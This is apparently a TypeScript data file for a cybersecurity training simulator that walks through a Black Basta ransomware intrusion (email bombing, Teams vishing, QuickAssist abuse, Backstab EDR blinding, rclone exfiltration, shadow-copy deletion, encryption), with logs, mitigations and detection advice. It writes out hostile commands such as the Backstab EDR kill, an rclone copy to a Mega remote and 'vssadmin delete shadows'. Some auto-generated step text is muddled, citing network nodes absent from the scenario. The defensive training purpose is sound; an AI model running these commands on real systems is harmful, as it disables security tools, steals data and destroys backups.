import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'blackbasta-qakbot-backstab-ransomware',
    title: 'Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Black Basta affiliates (Storm-1811) flood victim mailboxes with spam before calling over Microsoft Teams impersonating IT Help Desk to coerce Windows Quick Assist execution, deploy Backstab (PROCEXP.SYS BYOVD) to blind EDR, and detonate ChaCha20/RSA-4096 encryption (.basta).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Storm-1811 / Black Basta Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Microsoft Teams External Federation', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Workstation (QuickAssist.exe Session)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-131A / Defender XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Shares (.basta ChaCha20)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        narration:
          'Storm-1811 floods an employee’s corporate email inbox with thousands of newsletter signups, then calls the user via external Microsoft Teams federated chat impersonating "IT Security Help Desk" and convinces them to press Ctrl+Win+Q to launch Microsoft’s built-in QuickAssist.exe remote support tool.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1566.004 - Spearphishing Voice / T1219 - Remote Access Software)',
        technicalCommands: [
          'C:\\Windows\\System32\\QuickAssist.exe (User enters 6-digit operator security code over Microsoft Teams call)',
          'QuickAssist WebView2 session connects to *.remoteassistance.support.services.microsoft.com',
        ],
        defenseMitigation:
          'Restrict Microsoft Teams external federation to an explicit domain allowlist and block or remove `QuickAssist.exe` via AppLocker/Intune policies.',
        logs: [
          {
            id: 'basta-1',
            timestamp: '10:04:18.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'QuickAssist.exe',
            CommandLine: 'C:\\Windows\\System32\\QuickAssist.exe',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\QuickAssist.exe | PrecedingSignal: Inbound External Teams Call from "HelpDesk_Admin@onmicrosoft.com" + 1,800 SMTP Spam Messages | ChildProcess: powershell.exe / curl.exe',
            parsedFields: {
              SocialEngineeringVector: 'Email Bombing + External Microsoft Teams Vishing (Storm-1811)',
              RemoteSupportLolbin: 'C:\\Windows\\System32\\QuickAssist.exe',
              AdvisoryId: 'CISA AA24-131A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        narration:
          'Through the interactive Quick Assist session, the operator downloads payloads via cURL/MSI, uses Backstab (loading PROCEXP.SYS to close EDR file/process handles), scans the AD network with SoftPerfect netscan.exe, and exfiltrates files with rclone.exe.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Discovery (T1562.001 / T1046)',
        technicalCommands: [
          'backstab.exe -p MsMpEng.exe -k -d C:\\Users\\Public\\PROCEXP.SYS (Closes all kernel handles held by EDR)',
          'netscan.exe /hide && rclone.exe copy "\\\\fileserver\\corp" mega:basta_dump --transfers 16',
        ],
        defenseMitigation:
          'Monitor child processes spawned during active `QuickAssist.exe` sessions (`cmd.exe`, `powershell.exe`, `msiexec.exe`, `curl.exe`) and block `PROCEXP.SYS` via WDAC.',
        logs: [
          {
            id: 'basta-2',
            timestamp: '10:12:44.605',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'backstab.exe',
            CommandLine: 'C:\\Users\\Public\\backstab.exe -n MsMpEng.exe -k',
            raw: 'EDR Defense Evasion Alert | Tool: Backstab (BYOVD Handle Killer) | LoadedDriver: PROCEXP.SYS | ReconTool: SoftPerfect Network Scanner (netscan.exe) | ExfilTool: rclone.exe',
            parsedFields: {
              EdrEvasionTool: 'Backstab (PROCEXP.SYS IOCTL Handle Stripping)',
              NetworkScanner: 'SoftPerfect netscan.exe',
              ExfiltrationTool: 'rclone.exe',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        narration:
          'Using PsExec or PowerShell Invoke-Command across the domain, the operator deletes Volume Shadow Copies with vssadmin.exe, disables DNS/DHCP services if running in safe-mode, and encrypts files in 64-byte intermittent chunks using ChaCha20 and RSA-4096, appending the .basta extension.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1490)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet',
          'basta.exe -forcepath "\\\\corp-nas\\shares" (XChaCha20 + RSA-4096 encryption -> readme.faa.txt & .basta)',
        ],
        defenseMitigation:
          'Enforce SMB signing, block PsExec (`PSEXESVC.exe`) lateral service creation, and maintain immutable air-gapped backups.',
        logs: [
          {
            id: 'basta-3',
            timestamp: '10:45:02.119',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'basta.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\basta.exe | TargetFilename: \\\\corp-nas\\shares\\readme.faa.txt | Cipher: XChaCha20 + RSA-4096 | AppendedExtension: .basta',
            parsedFields: {
              RansomwareFamily: 'Black Basta',
              EncryptionAlgorithm: 'ChaCha20 (Intermittent 64-byte blocks) + RSA-4096',
              RansomNote: 'readme.faa.txt',
              FileExtension: '.basta',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'blackbasta-qakbot-backstab-ransomware',
    briefing: {
      headline:
        'Black Basta affiliates (Storm-1811) flood victim inboxes with spam before calling via Microsoft Teams impersonating IT Help Desk to coerce Windows Quick Assist execution, deploy Backstab (PROCEXP.SYS BYOVD) to blind EDR, and detonate ChaCha20 encryption (.basta).',
      storyAnalogy:
        'Imagine an extortion crew dumps 2,000 junk mail catalogs through an employee’s mail slot in five minutes. While the employee is overwhelmed, the crew rings the internal office video intercom wearing an "IT Help Desk" badge, says "We see your mailbox is glitching, press Ctrl+Win+Q so we can fix it," and tricks the employee into opening the side service door (QuickAssist.exe), through which they blind the guards (Backstab) and lock the building.',
      plainSummary:
        'In this scenario (T1566.004, Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: email Bombing, External Microsoft Teams, then backstab EDR Handle Killer, then vssadmin Shadow Wipe. Steps #1–#3 walk that chain end-to-end by covering Email Bombing, External Microsoft Teams, then Backstab EDR Handle Killer, then vssadmin Shadow Wipe, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Storm-1811 / Black Basta Operator -> Microsoft Teams External Federation -> Workstation (QuickAssist.exe Session) -> Enterprise Shares (.basta ChaCha20) -> CISA AA24-131A / Defender XDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / HHS Joint Advisory AA24-131A (#StopRansomware: Black Basta) / Microsoft Storm-1811 Analysis / Trend Micro Report',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1566.004',
        plainTitle: 'Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        storyAnalogy:
          'First the scammer jams the victim’s mailbox with thousands of magazines to create panic, then calls on the internal intercom pretending to be the mailroom technician offering to clean it up.',
        simpleExplanation:
          'Storm-1811 bombarded the target’s corporate email address with thousands of automated newsletter registrations (creating both distraction and a believable pretext for an urgent IT call, while burying real security alert emails in the flood), then initiated an external federated Microsoft Teams call impersonating "IT Help Desk" and instructed the user to launch C:\\Windows\\System32\\QuickAssist.exe (a pre-installed, Microsoft-signed remote support binary that establishes an encrypted outbound screen-sharing and remote-control session via *.remoteassistance.support.services.microsoft.com).',
        howItWorksInPractice:
          'Because QuickAssist.exe is natively included in Windows 10/11 and communicates exclusively with legitimate *.microsoft.com relay servers over HTTPS, standard perimeter firewalls and web proxies allow the session by default. In the documented EventID 1 exchange from Storm-1811 / Black Basta Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK 1 (confirming that the C:\Windows\System32\QuickAssist.exe request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Storm-1811 Operator through Microsoft Teams External Federation to the Workstation (QuickAssist.exe Session).',
        detectionAndEvidence:
          'Correlating high-volume inbound SMTP spam spikes with external Microsoft Teams calls and Sysmon EventID 1 execution of QuickAssist.exe.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        storyAnalogy:
          'Once inside via the remote-support screen, the intruder runs a tool that pries open the fingers of the security guards so they drop their weapons, maps the floorplan, and bags up the files.',
        simpleExplanation:
          'Inside the QuickAssist.exe session, the operator used curl.exe or msiexec.exe to stage payloads, executed Backstab (backstab.exe -n MsMpEng.exe -k, an open-source BYOVD utility that loads the signed Sysinternals PROCEXP.SYS driver to enumerate and forcibly close every kernel object and file handle held by Protected Process Light EDR agents), scanned internal subnets with SoftPerfect Network Scanner (netscan.exe), and exfiltrated sensitive shares using rclone.exe.',
        howItWorksInPractice:
          'Closing all kernel handles held by an EDR process via Backstab renders the security sensor deaf and unable to inspect files or processes even if the main user-mode .exe appears running in Task Manager. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to Microsoft Teams External Federation, Microsoft Teams External Federation responds with ALERT 1 (confirming that the C:\Users\Public\backstab.exe -n MsMpEng.exe -k request succeeded on Microsoft Teams External Federation and establishing the runtime state required for Step #3 Stage 3: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Workstation (QuickAssist.exe) to the CISA AA24-131A / Defender XDR Sensor as Backstab and netscan.exe execute.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 6 alerting on QuickAssist.exe spawning cmd.exe/powershell.exe/msiexec.exe and backstab.exe loading PROCEXP.SYS.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1486',
        plainTitle: 'vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        storyAnalogy:
          'After deleting the building’s backup snapshots, the encryptor races through every shared folder, scrambling 64 bytes out of every 192 bytes so files are ruined in seconds.',
        simpleExplanation:
          'Pivoting across the domain with PsExec or WMI, the operator ran vssadmin.exe delete shadows /all /quiet to destroy Volume Shadow Copies and executed the C++ Black Basta encryptor (basta.exe -forcepath, which uses a multi-threaded XChaCha20 stream cipher to encrypt 64-byte blocks alternating with 128-byte unencrypted gaps for maximum throughput, protects the per-file key with RSA-4096, appends .basta, and drops readme.faa.txt).',
        howItWorksInPractice:
          'By encrypting 64 bytes and skipping 128 bytes across large files, Black Basta corrupts multi-terabyte file servers in minutes before administrators can pull network cables. In the documented EventID 11 exchange from Microsoft Teams External Federation to Workstation (QuickAssist.exe Session), Workstation (QuickAssist.exe Session) responds with ACK 11 (confirming that the basta.exe request succeeded on Workstation (QuickAssist.exe Session) and completing the final execution objective of Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Workstation deploying basta.exe across Enterprise Shares (.basta ChaCha20).',
        detectionAndEvidence:
          'EDR behavioral blocking of vssadmin.exe delete shadows and detection of .basta file renames and readme.faa.txt ransom note creation.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a burglar who jams a victim mailbox with thousands of junk flyers and then calls right away dressed as a helpful postal technician offering to fix the jam over a built-in home intercom. Once invited onto the desk, the fake technician flashes an outdated inspector badge to unplug the security alarm wires, wheels boxes of family records out the back door, shreds the spare backup notebooks, and snaps heavy padlocks onto every filing cabinet.',
      storyMappings: [
        {
          storyTerm: 'Jamming the mailbox and calling as a helpful technician',
          technicalTerm: 'Email bombing followed by external Microsoft Teams vishing and QuickAssist.exe',
          tone: 'amber',
        },
        {
          storyTerm: 'Outdated inspector badge unplugging security alarm wires',
          technicalTerm: 'Backstab BYOVD tool abusing signed PROCEXP.SYS to strip EDR handles',
          tone: 'sky',
        },
        {
          storyTerm: 'Wheeling boxes of records out the back door',
          technicalTerm: 'SoftPerfect network discovery and Rclone cloud data exfiltration',
          tone: 'rose',
        },
        {
          storyTerm: 'Shredding backup notebooks and padlocking every cabinet',
          technicalTerm: 'vssadmin delete shadows /all /quiet followed by ChaCha20/RSA-4096 (.basta) encryption',
          tone: 'emerald',
        },
      ],
      plainSummary:
        'In this scenario (T1566.004, Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20 (AA24-131A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: email Bombing, External Microsoft Teams, then backstab EDR Handle Killer, then vssadmin Shadow Wipe. Steps #1–#3 walk that chain end-to-end by covering Email Bombing, External Microsoft Teams, then Backstab EDR Handle Killer, then vssadmin Shadow Wipe, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
    },
    steps: {
      1: {
        storyAnalogy:
          'First, the intruder floods an employee office inbox with thousands of noisy junk circulars so the desk looks overwhelmed, then immediately rings the employee on an external office intercom posing as IT support and talks them into typing a six-digit remote-control code.',
        storyMappings: [
          {
            storyTerm: 'Thousands of noisy junk circulars flooding the inbox',
            technicalTerm: 'Automated SMTP email bombing via mass newsletter subscription forms',
            tone: 'amber',
          },
          {
            storyTerm: 'External office intercom posing as IT support',
            technicalTerm: 'External tenant Microsoft Teams chat and voice phishing by Storm-1811',
            tone: 'sky',
          },
          {
            storyTerm: 'Built-in remote-control code',
            technicalTerm: 'Windows QuickAssist.exe interactive remote screen-control session',
            tone: 'rose',
          },
          {
            storyTerm: 'Bypassing email attachment scanners',
            technicalTerm: 'Human-authorized screen takeover requiring zero malicious email attachments',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Correlate sudden inbound SMTP spam bursts (thousands of subscription confirmations in minutes) with external tenant Microsoft Teams calls and Sysmon EventID 1 (Process Creation) execution of QuickAssist.exe (exposing the Storm-1811 helpdesk pretext before payload staging).',
      },
      2: {
        storyAnalogy:
          'Taking control of the mouse straight through the remote-help window, the fake technician pulls down a toolbox, flashes an older officially signed maintenance badge to sever the office alarm monitors, scans every hallway for open file rooms, and ships confidential folders out through a hidden courier tunnel.',
        storyMappings: [
          {
            storyTerm: 'Pulling down a toolbox through the remote-help window',
            technicalTerm: 'QuickAssist.exe spawning curl.exe or msiexec.exe to stage payloads',
            tone: 'amber',
          },
          {
            storyTerm: 'Older signed maintenance badge severing alarm monitors',
            technicalTerm: 'backstab.exe loading signed PROCEXP.SYS to close EDR protected process handles',
            tone: 'sky',
          },
          {
            storyTerm: 'Scanning hallways for open file rooms',
            technicalTerm: 'SoftPerfect Network Scanner enumerating internal servers and SMB shares',
            tone: 'rose',
          },
          {
            storyTerm: 'Shipping confidential folders through a courier tunnel',
            technicalTerm: 'Rclone exfiltrating staged archives to attacker cloud storage',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Alert on Sysmon EventID 1 (Process Creation capturing parent-child trees) and EventID 6 (DriverLoaded logging kernel driver images) when QuickAssist.exe spawns cmd.exe, powershell.exe, or msiexec.exe and when backstab.exe loads signed PROCEXP.SYS (catching BYOVD EDR blinding).',
      },
      3: {
        storyAnalogy:
          'Spreading rapidly down every connected corridor, the intruder runs a shredder through every backup recovery ledger on every server and snaps strong double-keyed locks across every shared cabinet, leaving a printed ransom letter on every desk.',
        storyMappings: [
          {
            storyTerm: 'Spreading down every connected corridor',
            technicalTerm: 'Domain-wide lateral propagation using PsExec or WMI across enterprise hosts',
            tone: 'amber',
          },
          {
            storyTerm: 'Shredding every backup recovery ledger',
            technicalTerm: 'vssadmin.exe delete shadows /all /quiet wiping Volume Shadow Copies',
            tone: 'sky',
          },
          {
            storyTerm: 'Double-keyed locks across every cabinet',
            technicalTerm: 'Black Basta ChaCha20 stream encryption wrapped by RSA-4096 appending .basta',
            tone: 'rose',
          },
          {
            storyTerm: 'Printed ransom letter on every desk',
            technicalTerm: 'Dropped readme.faa.txt extortion note demanding payment for decryption',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Configure EDR behavioral prevention to block vssadmin.exe delete shadows /all /quiet (which destroys native Windows recovery snapshots) and trigger immediate containment on rapid .basta file renames paired with readme.faa.txt creation.',
      },
    },
  };
